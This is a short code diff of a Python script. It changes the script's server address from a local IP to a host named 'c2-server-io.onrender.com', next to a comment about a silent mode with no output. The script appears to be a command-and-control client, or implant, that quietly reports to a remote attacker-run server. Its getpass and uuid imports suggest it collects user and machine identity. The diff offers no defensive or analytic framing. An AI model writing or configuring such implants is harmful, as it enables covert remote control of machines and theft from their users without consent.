@@ -5,7 +5,7 @@ from urllib.error import URLError
 import json,uuid,getpass
 
 # ============ CONFIGURATION ============
-SERVER = "http://192.168.8.38:5000"  # ← CHANGE THIS!
+SERVER = "https://c2-server-io.onrender.com"  # ← CHANGE THIS!
 # =======================================
 
 # Silent mode - no output at all
@@ -217,3 +217,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+
